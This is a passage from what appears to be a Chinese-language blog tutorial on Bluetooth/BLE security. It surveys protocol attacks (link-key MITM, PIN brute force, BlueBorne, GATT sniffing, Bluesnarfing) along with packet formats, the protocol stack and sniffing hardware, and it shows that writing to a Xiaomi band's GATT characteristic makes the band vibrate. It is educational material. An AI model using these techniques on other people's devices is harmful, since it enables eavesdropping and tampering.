<li>双方认证：双向认证采用challenge-response(挑战-应答)方式。主设备A位应答方，从设备B为请求方。作为应答方的A设备产生一个128位的随机数AU_RANDA，并以明文的方式传送至B设备。A、B设备都用E1算法将各自的到的AU_RAND、Kab和BD_ADDRB加密运算分别生成32位的SRESA和SRESB。B设备将结果SRESB传送给A设备，A设备比较SERESA和SERSB，如果两个的值相等，此次认证通过，如果两个的值不想等，则认证不通过。执行完此次认证后，A设备和B设备的角色对换，即A设备作为请求方，B设备作为应答方，采用同样的方式进行认证。</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34183.png" alt="0"></p>
<h2 id="0x03-BLE常见问题"><a href="#0x03-BLE常见问题" class="headerlink" title="0x03 BLE常见问题"></a><strong>0x03 BLE常见问题</strong></h2><p>蓝牙（bluetooth）同WIF和zigbee等等网络协议一样，因此它的网络协议通信结构和它们大同小异。</p>
<p>因此，它的攻击手段不外乎鉴权攻击、密钥攻击、拒绝服务攻击等等几种手段，只不过随着具体的场景不同，这些攻击手段所赐啊去的具体方法也不同。</p>
<p>在上述的几种攻击方法里，蓝牙的安全问题可以分为两类：第一类是蓝牙协议本存在的问题。例如有攻击工具：Bluenarfing、Bluebugging、Hijacking等。</p>
<h3 id="1-针对蓝牙协议本身的攻击"><a href="#1-针对蓝牙协议本身的攻击" class="headerlink" title="1.针对蓝牙协议本身的攻击"></a><strong>1.针对蓝牙协议本身的攻击</strong></h3><h4 id="a-节点密钥攻击（中间人）"><a href="#a-节点密钥攻击（中间人）" class="headerlink" title="a.节点密钥攻击（中间人）"></a><strong>a.节点密钥攻击（中间人）</strong></h4><p>假设一个设备A和B之前已经通信过，当通信完成之后，A和B是互相知道彼此的链路密钥的。这里解释一下什么叫链路密钥：A和B之间的通信是需要加密的，怎么加密的不管，总之就是需要一个链路密钥这样的一个东西，每次通信的链路密钥是根据蓝牙本身自带生成的，这个链路密钥不是放在协议层生产的，而是蓝牙硬件自身就有的。那么B显然之后A所使用的链路密钥，那么B通过修改自身地址，把自己的地址改为A的地址后，伪装成A和C通信，那么C此时就以为自己和A通信。B也可以伪装成C和A去通信，因为B知道A的链路密钥，B是能够通过A的认证从而和A进行连接 。</p>
<p>这样 A和 C之间并没有进行实质的通信 ，都是B分别伪装和A，C通信。这样就造成了中间人攻击。</p>
<p>这种中间人攻击的主要原因在于蓝牙通信链路密钥在硬件层生产，而且每次认证都相同。</p>
<h4 id="b-针对PIN码攻击"><a href="#b-针对PIN码攻击" class="headerlink" title="b.针对PIN码攻击"></a><strong>b.针对PIN码攻击</strong></h4><p>两个设备之间的链接，在应用层上使用PIN码，4位PIN码破解仅仅需要0.06秒，8位暴力攻击不到两个小时就能破解。</p>
<h4 id="c-中继攻击"><a href="#c-中继攻击" class="headerlink" title="c.中继攻击"></a><strong>c.中继攻击</strong></h4><p>蓝牙设备使用中继以夸大传输距离，几乎所有的中继攻击，中继设备都有可能遭到信息窃取</p>
<h4 id="d-鉴权DOS攻击"><a href="#d-鉴权DOS攻击" class="headerlink" title="d.鉴权DOS攻击"></a><strong>d.鉴权DOS攻击</strong></h4><p>鉴权时的DOS攻击是从上一次鉴权失败到下一次可以发起鉴权期间，第三方通过伪装发起故意使鉴权失败，从而使间隔时间持续上升，知道达到允许的最大值，在此期间双方不能进行正常的鉴权。</p>
<p>还有一种形式的DOS攻击，快速不断的给远程蓝牙发送文件，而远端设备呗大量的是否要接收该文件的命令冲击直到瘫痪。</p>
<h3 id="2-针对蓝牙实现过程发起的攻击"><a href="#2-针对蓝牙实现过程发起的攻击" class="headerlink" title="2.针对蓝牙实现过程发起的攻击"></a><strong>2.针对蓝牙实现过程发起的攻击</strong></h3><h4 id="a-BlueBorne"><a href="#a-BlueBorne" class="headerlink" title="a. BlueBorne"></a><strong>a. BlueBorne</strong></h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/t01fa596689092bd57a.png" alt="image"></p>
<ul>
<li><a href="https://armis.com/blueborne/">https://armis.com/blueborne/</a></li>
<li><a href="https://www.antiy.cn/research/notice&report/research_report/20170918.html">基于蓝牙协议漏洞的BLUEBORNE攻击综合分析报告</a></li>
<li><a href="https://www.anquanke.com/post/id/86949">BlueBorne 蓝牙漏洞深入分析与PoC</a></li>
</ul>
<p>是由armis爆出的一系列蓝牙的漏洞，只要手机开启了蓝牙，就可能被远程控制。当然根据上面的分析可以看到通过多种平台的漏洞综合利用，可以完成对大部分支持蓝牙的设备进行攻击。但是在安天的报告里有一句我没懂“不像其它驱动一样，每个操作系统都只有一个蓝牙协议栈，这导致一个漏洞的出现将会影响一系列基于此系统的设备。”其他驱动是啥样？大概的意思就是内核驱动的漏洞吧，不过能看到的是通过这组漏洞可以实现ios，android，linux的rce，以及windows下的中间人攻击。</p>
<h4 id="b-GATT"><a href="#b-GATT" class="headerlink" title="b. GATT"></a><strong>b. GATT</strong></h4><ul>
<li><a href="https://gattack.io/">https://gattack.io/</a></li>
</ul>
<p>从蓝牙4.0的低功耗蓝牙（BLE）开始到4.2开始支持GATT（Generic Attribute Profile）再到BLE5，蓝牙技术已经瞄准了物联网这个方向。所以很多特性都是针对物联网的情景而生的，比如GATT。GATT中的三个要素Profile、Service、Characteristic以及他们的层级关系。值得注意的是，“Profile”是基于GATT所派生出的真正的Profile，乃SIG蓝牙技术联盟对一些同范畴内的Service打包后的集合，如电池、心率、血压等用于让两个设备进行连接后的通讯。GATT 定义设备之间通过 Service 和 Characteristic 的东西来进行通讯，不同的 Characteristic 代表设备的不同功能。GATT协议可以在蓝牙设备不完成配对的情况下进行访问，因此，通信流量明文传输，如果应用层没有加密或者校验，则可以被轻易地嗅探和伪造数据。</p>
<p>相关paper:</p>
<ul>
<li><a href="http://gattack.io/whitepaper.pdf">GATTACKING BLUETOOTH SMART DEVICES</a></li>
<li><a href="https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_06B-4_Xu_paper.pdf">BadBluetooth: Breaking Android Security Mechanisms via Malicious Bluetooth Peripherals</a></li>
</ul>
<h4 id="c-Bluesnarfing"><a href="#c-Bluesnarfing" class="headerlink" title="c.Bluesnarfing"></a><strong>c.Bluesnarfing</strong></h4><p>蓝牙定义了OBEX协议，只鹅个协议的重要目的是实现数据对象的交换。蓝牙早期规范定义了一个基于OBEX的应用，这个应用主要用来实现使用蓝牙来传输一些名片，这个过程并不需要使用鉴权机制，Bluesnarfing就是利用此漏洞连接到手机用户，并且不提示用户已连接。</p>
<p>当不使用蓝牙时，将设备设置成不可发现的模式，或者在通信时将设备设置成为安全模式3来启动链路鉴权，对一些蓝牙设备进行升级可以有效预防此类攻击。</p>
<h4 id="d-Bluebugging"><a href="#d-Bluebugging" class="headerlink" title="d.Bluebugging"></a><strong>d.Bluebugging</strong></h4><p>Bluebugging和Bluesnarfing相似，在事先不通知货提示手机用户的情况下，访问手机命令。</p>
<h4 id="e-Peripheral-Hijacking"><a href="#e-Peripheral-Hijacking" class="headerlink" title="e.Peripheral Hijacking"></a><strong>e.Peripheral Hijacking</strong></h4><p>有些设备尽管没有进入连接模式也会对连接请求进行相应，这类设备通常是一些没有MMI（Man Machine Interface）的设备。例如一些蓝牙耳机会被强制连接，还有一些设备有固定的PIN码，Peripheral Hijacking即是对此类设备进行攻击。</p>
<h4 id="f-Bluejacking"><a href="#f-Bluejacking" class="headerlink" title="f.Bluejacking"></a><strong>f.Bluejacking</strong></h4><p>Bluejacking是指手机用户使用蓝牙无线技术匿名向赴京的蓝牙用户发送名片或不许奥信息的行为。Bluejacking通常会寻找ping的通的手机或者有反应的手机，随后会发送更多的其他个人信息到该设备。现在市场上已经出现了很多Bluejacking软件。可以通过把手机设置成不可发现模式来避免此类攻击。</p>
<h2 id="0x04-信道"><a href="#0x04-信道" class="headerlink" title="0x04 信道"></a><strong>0x04 信道</strong></h2><p>BLE的物理通道即”频道”，分别是‘f=2402+k*2 MKz, k=0 , … ,39’, 宽带为2MHz的40个RF Channel。</p>
<p>其中，有3个信道是advertising channel(广播通道)，分别是37、38、39，用于发现设备(Scanning devices)、初始化连接(initiating a connection)和广播数据(broadcasting date)</p>
<p>剩下的37个信道为data channel(数据通道)，用于两个连接的设备间的通讯。</p>
<h2 id="0x05-BLE数据包格式"><a href="#0x05-BLE数据包格式" class="headerlink" title="0x05 BLE数据包格式"></a><strong>0x05 BLE数据包格式</strong></h2><p>在低功耗蓝牙规范中，分广播报文和数据报文这两种。设备利用广播报文发现、连接其它设备，而在连接建立之后，便开始使用数据报文。无论是广播报文还是数据报文，链路层只使用一中数据包格式，它由”前导码”(preamble)、”访问码”(access code)、”有效载荷”和”循环冗余校验”（Cyclical Redundancy CHeck，CRC）校验码组成。其中，”访问码”有时又称为”访问地址”(access address)</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34506.png" alt="0"></p>
<h3 id="1-Preamble"><a href="#1-Preamble" class="headerlink" title="1.Preamble"></a>1.Preamble</h3><p>1个字节长度，接受中用于频率同步、数据速率同步、自动增益控制调整，固定为                        01010101或者10101010序列</p>
<h3 id="2-Access-Address"><a href="#2-Access-Address" class="headerlink" title="2.Access Address"></a>2.Access Address</h3><p>4个字节长度，广播报文接入地址为：0x8E89BED6,数据报文接入地址为：32bits随机数</p>
<h3 id="3-PDU"><a href="#3-PDU" class="headerlink" title="3.PDU"></a>3.PDU</h3><p>i.广播报文（见嫌疑BLUETOOTH SPECIFICATION Version 4.0 [Vol 6] Part B 2.3）</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34523.png" alt="0"></p>
<p>i. PDU Type: 有效载荷内容的类型，通过这一字段确定改数据包是一个”通告”还是”扫描请求”或”响应”等</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34532.png" alt="0"></p>
<p>ii. RFU 保留位</p>
<p>iii. TxAdd：发送地址字段</p>
<p>iv. RxAdd：接收地址字段</p>
<p>v. Payload Length：用来表示”有效载荷数据”(payload data)的长度，不包括头部内容</p>
<p>ii.数据报文（见协议BLUETOOTH SPECIFICATION Version 4.0 [Vol 6] Part B 2.4）</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34544.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34546.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34548.png" alt="0"></p>
<p>1.LLID（逻辑链路ID）：0x01表示该数据包是一个帧的延续内容，或者这是一个空的“逻辑链路控制及适配协议”数据包；0x02表示一个“逻辑链路控制及适配协议”数据包的开始；0x03表示这是一个“逻辑链路控制”数据包的内容</p>
<p>2.NESN：下一个期望的序列号，用于对接受到的数据包进行确认</p>
<p>3.MD：更多数据字段，主要是为了说明发送发是否还有要发给接收者的数据</p>
<p>4.RFU 保留位</p>
<p>5.Payload Length：用以表示包含”信息完整性校验码”（Message Integrity Check，MIC）在内的“有效载荷数据”的长度</p>
<p>4.CRC</p>
<p>3个字节长度，“循环冗余校验”（Cyclical Redundancy Check, CRC），可检查数据的正确性</p>
<h2 id="0x06-BLE-协议栈"><a href="#0x06-BLE-协议栈" class="headerlink" title="0x06 BLE 协议栈"></a><strong>0x06 BLE 协议栈</strong></h2><p>BLE协议栈的结构图如下所示：</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34568.png" alt="0"></p>
<p>各个结构简述：</p>
<ul>
<li>PHY：使蓝牙可以使用2.4GHz频道，并且能自适应的调频。</li>
<li>LL层：控制设备处于 准备、广播、监听、初始化、连接等5个状态</li>
<li>HCI层：向上为主机提供软件应用程序接口，对外为外部硬件提供控制接口</li>
<li>L2CAP层：对传输数据实行封装。</li>
<li>SM层：提供主机和客机的配对和密钥分发，实现安全连接和数据交换。</li>
<li>ATT层：对数据主机或客机传入的指令进行指令搜索处理</li>
<li>GATT层：接受和处理主机或客机传入的指令进行指令搜索处理</li>
<li>GAP层：向上提供API，向下合理分配各个层工作。</li>
</ul>
<h3 id="1-Physical-Layer"><a href="#1-Physical-Layer" class="headerlink" title="1. Physical Layer"></a><strong>1. Physical Layer</strong></h3><p>任何一个通信系统，首先要确定的就是通信介质(物理通道，Physical Channel)，BLE也不例外。在BLE协议中，”通信介质”的定义是由Physical Layer（其他通信协议也类似）负责。</p>
<p>Physical Layer是这样描述BLE的通信介质的：</p>
<p>​                由于BLE属于无线通信，则其通信介质是实顶频率范围下的频率资源(Frequency Band) BLE的市场定位是个体和名用，因此使用免费的ISM频段(频率范围是2.400-2.4835Ghz) 为了同时支持多个设备，将真个频带分为40份，每份的宽带为2MHz，称作RF Channel              </p>
<p>所以经过上面的定义之后，可以推测出BLE的物理通道，即“评到分别是’f=2402+k*2 MHz，k=0,…,39’,宽带为2MHz”的40个RFChannel。其中，有3个信道是advertising channel（广播通道），分别是37、38、39，用于发现设备（Scanning devices）、舒适化连接(initiating a connection)和广播数据(broadcasting date)；剩下的37个信道为data channel（数据通道），用于两个连接的设备间的通讯。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34607.png" alt="0"></p>
<h3 id="2-Link-Layer"><a href="#2-Link-Layer" class="headerlink" title="2. Link Layer"></a><strong>2. Link Layer</strong></h3><p>Link Layer用于控制设备的射频状态，设备将处于Standby(待机)、Advertising（通告）、Scanning（扫描）、Initiating（初始化）、Connection（连接）这五种状态中的一种。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34606.png" alt="0"></p>
<ul>
<li>待机状态（Standby State）：此时即不发送数据，也不接受数据，对设备来说也是最节能的状态；</li>
<li>通告状态（Advertising State）：通告状态下的设备一般也被称为 “通告者”（Advertiser），它会通过advertising channel（广播通道）周期性的发送数据，广播的数据可以由处于Scanning state或Initiating state的实体接受；</li>
<li>扫描状态（Scanning State）：可以通过advertising channel（广播通道）接受数据的装填，该状态下的设备又被称为“扫描者”（Scanner）。此外，更具advertiser所广播的数据类型，有些Scanner还可以主动向Advertiser请求一些额外数据</li>
<li>初始化状态（Initiating State）：和Scanning State类似，不过是一种特殊的状态。Scanner会侦听所有的advertising channel，而Initator（初始化者）则只侦听某个特定设备的广播，并在接受到数据后，发送连接请求，以便和Advertiser建立连接</li>
<li>连接状态（Connection State）：由Initiating State或Advertising State自动切换而来，处于Connection State的双方，分别有两种角色。其中，Initiater方被称为Mater（主设备），Advertiser方则称作Slave（从设备）。</li>
</ul>
<h3 id="3-HCI"><a href="#3-HCI" class="headerlink" title="3. HCI"></a><strong>3. HCI</strong></h3><p>主机控制接口层（Host Controller Interface，简写HCI）：定义Host（主机）和Controller（控制器）之间的通信协议，这一层可以是软件或者硬件接口，入UART、SPI、USB等</p>
<h3 id="4-Generic-Access-Profile-GAP"><a href="#4-Generic-Access-Profile-GAP" class="headerlink" title="4. Generic Access Profile(GAP)"></a><strong>4. Generic Access Profile(GAP)</strong></h3><p>前面Link Layer虽然对连接建立的过程做了定义，但它听没有体现到Application（或者 Profile）层面，而GAP则是直接与应用程序或配置文件通信的接口，它实现了如下功能：</p>
<ul>
<li><p>定义GAP层的蓝牙设备角色（role）</p>
</li>
<li><ul>
<li>Broadcaster（广播者）：设备正在发送advertising events</li>
<li>Obserber（观察者）：设备正在接受advertising events</li>
<li>Peripheral（外设）：设备接受Link Layer连接（对应Link Layer的slave角色）</li>
<li>Central（主机）：设备发起Link Layer连接（对应Link Layer的master角色）</li>
</ul>
</li>
<li><p>定义GAP层的用于实现各种通信的操作模式（Operational Mode）和过程（Procedures）</p>
</li>
<li><ul>
<li>Broadcastmode and observation procedure，实现单向的、无连接的通信方式</li>
<li>Discovery modes and procedures，实现蓝牙设备的发现操作</li>
<li>Connection modes and procedures，实现蓝牙设备的连接操作</li>
<li>Bonding modes and procedures，实现蓝牙设备的配对操作</li>
</ul>
</li>
<li><p>定义User Interface有关的蓝牙参数，包括蓝牙地址、蓝牙名称、蓝牙的PIN码等</p>
</li>
<li><p>Security相关的定义</p>
</li>
</ul>
<h3 id="5-Logical-Link-Control-and-Adaptation-Protocol（L2CAP-Protocol）"><a href="#5-Logical-Link-Control-and-Adaptation-Protocol（L2CAP-Protocol）" class="headerlink" title="5. Logical Link Control and Adaptation Protocol（L2CAP Protocol）"></a><strong>5. Logical Link Control and Adaptation Protocol（L2CAP Protocol）</strong></h3><p>逻辑链路控制及自适应协议层（Logical Link Control and Adaptation Protocol）：为上层提供数据封装服务，允许逻辑上的点对点数据通信。</p>
<h3 id="6-Security-Manager（SM）"><a href="#6-Security-Manager（SM）" class="headerlink" title="6. Security Manager（SM）"></a><strong>6. Security Manager（SM）</strong></h3><p>Security Manager负责BLE通信中有关安全的内容，包括配对（pairing,）、认证（authentication）和加密（encryption）等过程。</p>
<h3 id="7-Attribute-protocol（ATT）"><a href="#7-Attribute-protocol（ATT）" class="headerlink" title="7. Attribute protocol（ATT）"></a><strong>7. Attribute protocol（ATT）</strong></h3><p>在BLE协议栈中，Physical Layer负责提供一系列的Physical Channel；基于这些Physical Channel，Link Layer可在两个设备之间建立用于点对点通信的Logical Channel；而L2CAP则将这个Logical Channel换分为一个个的L2CAP Channel，以便提供应用程序级别的通道复用。到此之后，基本协议栈已经构建完毕，应用程序已经可以基于L2CAP欢快的run起来了。</p>
<p>谈起应用程序，就不得不说BLE的初衷——物联网。物联网中传输的数据和传统的互联网有什么区别呢？抛开其它不谈，物联网中最重要、最广泛的一类应用是：信息的采集。</p>
<p>这些信息往往都很简单，如温度、湿度、速度、位置信息、电量、水压、等等。</p>
<p>采集的过程也很简单，节点设备定时的向中心设备汇报信息数据，或者，中心设备在需要的时候主动查询。</p>
<p>基于信息采集的需求，BLE抽象出一个协议：Attribute protocol，该协议将这些“信息”以“Attribute（属性）”的形式抽象出来，并提供一些方法，供远端设备（remote device）读取、修改这些属性的值（Attribute value）。</p>
<p>Attribute Protocol的主要思路包括：</p>
<ol>
<li>基于L2CAP，使用固定的Channel ID</li>
<li>采用client-server的形式。提供信息（以后都将其称为Attribute）的一方称作ATT server（一般是那些传感器节点），访问信息的一方称作ATT client。</li>
<li>一个Attribute由Attribute Type、Attribute Handle和Attribute Value组成。</li>
</ol>
<ul>
<li><ol>
<li>Attribute Type用以标示Attribute的类型，类似于我们常说的“温度”、“湿度”等人类可识别的术语，通过UUID进行区分。</li>
<li>Attribute Handle是一个16-bit的数值，用作唯一识别Attribute server上的所有Attribute。Attribute Handle的存在有如下意义：</li>
</ol>
</li>
<li><ul>
<li><ol>
<li>一个server上可能存在多个相同type的Attribute，显然，client有区分这些Attribute的需要。</li>
<li>同一类型的多个Attribute，可以组成一个Group，client可以通过这个Group中的起、始handle访问所有的Attributes。</li>
</ol>
</li>
</ul>
</li>
<li><ol>
<li>Attribute Value代表Attribute的值，可以是任何固定长度或者可变长度的octet array。</li>
</ol>
</li>
</ul>
<ol>
<li>Attribute能够定义一些权限（Permissions），以便server控制client的访问行为，包括：</li>
</ol>
<ul>
<li><ol>
<li>访问有关的权限（access permissions），Readable、Writeable以及Readable and writable；</li>
<li>加密有关的权限（encryption permissions），Encryption required和No encryption required；</li>
<li>认证有关的权限（authentication permissions），Authentication Required和No Authentication Required；</li>
<li>授权有关的权限（authorization permissions），Authorization Required和No Authorization Required。</li>
</ol>
</li>
</ul>
<ol>
<li>根据所定义的Attribute PDU的不同，client可以对server有多种访问方式，包括：</li>
</ol>
<ul>
<li><ol>
<li>Find Information，获取Attribute type和Attribute Handle的对应关系；</li>
<li>Reading Attributes，有Read by type、Read by handle、Read by blob（只读取部分信息）、Read Multiple（读取多个handle的value）等方式；</li>
<li>Writing Attributes，包括需要应答的writing、不需要应答的writing等。</li>
</ol>
</li>
</ul>
<h3 id="8-Generic-Attribute-profile（-GATT）"><a href="#8-Generic-Attribute-profile（-GATT）" class="headerlink" title="8. Generic Attribute profile（ GATT）"></a>8. Generic Attribute profile（ GATT）</h3><p>ATT之所以称作“protocol”，是因为它还比较抽象，仅仅定义了一套机制，允许client和server通过Attribute的形式共享信息。至于具体共享哪些信息，ATT并不关心，这是GATT（Generic Attribute Profile）的主场。GATT相对ATT只多了一个‘G‘，然含义却大不同，因为GATT是一个profile（更准确的说是profile framework）。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34640.png" alt="0"></p>
<p>由上图可知，GATT中的三个要素Profile、Service、Characteristic以及他们的层级关系。值得注意的是，“Profile”是基于GATT所派生出的真正的Profile，乃SIG蓝牙技术联盟对一些同范畴内的Service打包后的集合，如电池、心率、血压等，可参照<a href="https://developer.bluetooth.org/TechnologyOverview/Pages/Profiles.aspx#GATT">官方Profiles Overview</a>，对分析并无大用。</p>
<p>Service和Characteristic则是比较重要的，Service可以理解为PHP中的“类”、功能对象的集合。Characteristic可以理解为PHP的“函数”，是GATT中具体的功能对象，每个Service都可以包含一个或多个Characteristic（特征）。Characteristic是GATT profile中最基本的数据单位，由一个Properties、一个Value、一个或者多个Descriptor组成。</p>
<p>以上除“Profile”外的每一个定义，Service、Characteristic、Characteristic Properties、Characteristic Value、Characteristic Descriptor等等，都是作为一个Attribute存在的，具备前面所描述的Attribute的所有特征：Attribute Handle、Attribute Types、Attribute Value和Attribute Permissions。</p>
<p>在理解了GATT后，就已经能够分析或是“黑掉”一些BLE设备了。这里拿小米手环做例子，当LightBlue连上小米手环后，可以看到一个名为FEE7的UUID，如下所示：</p>
<p>其中，FEE7是一个私有Service的UUID，里面的0xFE**则是私有Characteristic的UUID。下面的Immediate Alert 显示出了名称，代表其不是小米私有的Service，而是官方公开定义的Service。点击进入这个Characteristic，看到它的UUID为2A06。然后我们到蓝牙官网定义的列表<a href="https://developer.bluetooth.org/gatt/characteristics/Pages/CharacteristicsHome.aspx">Characteristics</a>搜索2A06，进入Characteristic的详情页面。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34644.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34646.jpeg" alt="0"></p>
<p>其中，FEE7是一个私有Service的UUID，里面的0xFE**则是私有Characteristic的UUID。下面的Immediate Alert 显示出了名称，代表其不是小米私有的Service，而是官方公开定义的Service。点击进入这个Characteristic，看到它的UUID为2A06。然后我们到蓝牙官网定义的列表搜索2A06，进入Characteristic的详情页面。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34650.png" alt="0"></p>
<p>于是，该Characteristic操作定义非常明确了。点击“Write new value”，可以写入新的值。若写入1或2，则可以引起手环的震动。</p>
<h2 id="0x07-嗅探工具"><a href="#0x07-嗅探工具" class="headerlink" title="0x07 嗅探工具"></a>0x07 嗅探工具</h2><p>商业级的Ellisys BEX400侦听工具最为符合对BLE流量捕获及分析的要求，然而售价过于昂贵；</p>
<p>其次，作为开源硬件且配有混杂模式追踪的“超牙”设备——Ubertooth One拥有二次开发和嗅探已建立连接的蓝牙通信数据包的能力；</p>
<p>而淘宝购买的廉价CC2540开发板则作为最佳替补方案。</p>
<h3 id="1-低功耗蓝牙SOC"><a href="#1-低功耗蓝牙SOC" class="headerlink" title="1. 低功耗蓝牙SOC"></a>1. 低功耗蓝牙SOC</h3><p>低功耗蓝牙推出以来，众多厂商根据标准规范实现了不同的解决方案，包括TI的CC2540\2541、北欧Nordic的nRF51822、CSR的1000\1001、Quintic的QN9020\9021（现在被NXP收购）、Broadcom的BCM20732等。其中，在开发者当中比较知名的是TI的CC254x系列和Nordic的NRF51822，并且这两款产品当有着自己的开发板和用于嗅探的调试工具。</p>
<h4 id="a-CC2540"><a href="#a-CC2540" class="headerlink" title="a. CC2540"></a>a. CC2540</h4><p>德州仪器的CC2540，是一款高性价比、低功耗的片上系统（SOC）解决方案，适合蓝牙低功耗应用。它包含了一个8051内核的RF收发器，可编程闪存，8KB RAM和其他功能强大的配套特征及外设。CC2540有两种版本：CC2540F128 / F256，分别为128和256 KB的闪存，结合TI的低功耗蓝牙协议栈，CC2540F128 / F256形成了市场上最灵活，性价比也最高的单模式蓝牙BLE解决方案。<br>CC2540 USB Dongle的实物图如下，它可以配合TI的PacketSniffer软件实现对BLE无线抓包：</p>
<p>实际上，任意包含CC2540芯片的开发板都能实现BLE流量嗅探的功能。不过，TI官方并没有将侦听BLE的源代码放出，仅提供了烧写到USB Dongle的固件</p>
<p>在这个基础上，如果想要实现更多的功能，比如监听指定范围内所有的低功耗蓝牙设备的流量，就有必要对其进行逆向或者自己完全重写个程序。。</p>
<h4 id="b-NRF51822"><a href="#b-NRF51822" class="headerlink" title="b. NRF51822"></a>b. NRF51822</h4><p>挪威Nordic Semiconductor（简称Nordic）公司的nRF51822，是一款多协议ARM内核蓝牙4.0低功耗/ 2.4GHz 专用RF的单芯片解决方案。它基于Cortex-M0 内核，配备16kB RAM，可编程闪存，提供128 KB和 256 KB Flash两种版本供用户选择。</p>
<p>nRF51822 USB Dongle及开发板套件如下所示：</p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984345-9d153e00-ffa2-11e8-8db0-9a32847bcc14.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984345-9d153e00-ffa2-11e8-8db0-9a32847bcc14.png" alt="img"></a></p>
<p>刷入以下固件，配合官方的BLE sniffer程序，即可实现蓝牙流量的嗅探功能</p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984344-9d153e00-ffa2-11e8-877a-7ff3b7963762.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984344-9d153e00-ffa2-11e8-877a-7ff3b7963762.png" alt="img"></a></p>
<p>不同与cc2540的Packet Sniffer，该程序无需事先在3个广播信道中指定其一进行守候，只要指定要监听的设备，就会自动进行追踪，并能够配合Wireshark解析BLE数据包，可以很直观的显示出内部的层级关系和各字段含义。比较遗憾的是，实际使用发现它并没有CC2540 USB Dongle稳定，经常会抓不到后面数据通信的网络包，不过这一问题应该是可以通过优化算法得到解决的，但需要对官方的固件进行逆向或自己根据Nordic公司提供的BLE协议栈重写代码。。</p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984347-9e466b00-ffa2-11e8-943a-caef7f703349.jpg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984347-9e466b00-ffa2-11e8-943a-caef7f703349.jpg" alt="img"></a></p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984319-9981b700-ffa2-11e8-9850-dd3b4187f32f.jpg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984319-9981b700-ffa2-11e8-9850-dd3b4187f32f.jpg" alt="img"></a></p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984323-9981b700-ffa2-11e8-8e99-1ef51eab3cd2.jpg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984323-9981b700-ffa2-11e8-8e99-1ef51eab3cd2.jpg" alt="img"></a></p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984325-9a1a4d80-ffa2-11e8-8c4b-23c0b851d5da.jpg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984325-9a1a4d80-ffa2-11e8-8c4b-23c0b851d5da.jpg" alt="img"></a></p>
<p>优点：</p>
<ul>
<li>价格便宜，USB Dongle淘宝价70元左右，整套开发板售价约200软妹币上下</li>
<li>无需事先在3个广播信道中指定其一进行守候，只要指定要监听的设备，就会自动进行追踪</li>
<li>官方提供的BLE Sniffer程序可配合Wireshark工具对嗅探到的低功耗蓝牙数据包进行解析，能够很直观的显示出内部的层级关系和各字段含义</li>
</ul>
<p>缺点：</p>
<ul>
<li>不用指定广播信道，确实操作起来比较方便，但与之相对的是经常无法抓到后面的通信数据包。无论是作为开发用的调试工具，还是分析用的嗅探工具，都不够理想</li>
</ul>
<h5 id><a href="#" class="headerlink" title></a></h5><h3 id="2-商业侦听工具"><a href="#2-商业侦听工具" class="headerlink" title="2. 商业侦听工具"></a>2. 商业侦听工具</h3><h4 id="a-Frontline-BPA®-600"><a href="#a-Frontline-BPA®-600" class="headerlink" title="a. Frontline BPA® 600"></a>a. Frontline BPA® 600</h4><p>Frontline Test Equipment——“前线测试设备”（简称“前线”，Frontline），主要是针对各种各样的协议所做的一个“协议分析器”。“前线”系统的销售策略是“卖硬件，送软件”，而软件自然是和硬件相关联的，其侦听范围包括SCADA系统、RS-232串口通信、Ethernet以太网通信、ZigBee网络通信，以及蓝牙网络技术。Frontline旗下的BPA® 600双模蓝牙协议分析仪，能够把从空中获取到的基础速率/ 增强数据速率（BR/EDR）的传统蓝牙无线通信和低功耗蓝牙无线通信数据同时直观的显示出来。</p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984340-9c7ca780-ffa2-11e8-9f1a-ef9a2fca5d95.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984340-9c7ca780-ffa2-11e8-9f1a-ef9a2fca5d95.png" alt="img"></a></p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984338-9c7ca780-ffa2-11e8-8c9c-71b47e26f060.jpg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984338-9c7ca780-ffa2-11e8-8c9c-71b47e26f060.jpg" alt="img"></a></p>
<p>优点：</p>
<ul>
<li>无角色指定链路抓取意味着在初始化设置时不再需要指定哪个设备是主设备（master），哪个设备是从设备（slave）</li>
<li>能够同时可视化的监视低功耗蓝牙技术所使用的三个广播信道</li>
<li>同时抓取和解密多条蓝牙链路</li>
<li>链路密钥可自动从第三方软件或调试工具导入到BPA 600</li>
<li>支持蓝牙SIG组织发布的所有的协议和应用层协议，完全支持蓝牙4.1版本</li>
</ul>
<p>缺点：</p>
<ul>
<li>十分昂贵，<a href="http://www.fte.com/">官网</a>上虽并未公布具体的价格信息，需要与对方进行联系，但淘宝价格在15万左右</li>
